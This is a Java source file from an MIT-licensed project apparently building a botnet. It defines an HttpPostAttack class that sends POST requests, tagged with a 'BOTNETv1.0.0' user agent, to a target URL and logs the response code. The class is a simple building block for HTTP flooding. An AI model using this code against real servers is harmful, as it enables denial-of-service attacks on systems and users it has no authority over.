/**
 * The MIT License (MIT)
 *
 * Copyright (c) 2016 Giacomo Marciani, Michele Porretta
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package com.acmutv.botnet.attack;

import com.acmutv.botnet.target.HttpTarget;
import com.acmutv.botnet.service.Logger;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

/**
 * This class realizes a HTTP POST attack.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see HttpAttack
 */
public class HttpPostAttack extends HttpAttack {

  public HttpPostAttack(HttpTarget target, Random rndgen) {
    super(target, rndgen);
  }

  public HttpPostAttack(HttpTarget target) {
    super(target, new Random());
  }


  public void makeAttack(final URL url) throws IOException {
    HttpURLConnection http = (HttpURLConnection) url.openConnection();
    http.setRequestMethod("POST");
    http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
    int response = http.getResponseCode();

    Logger.info(String.format("HTTP-ATTACK :: POST %s :: %s", url, response));
  }

}
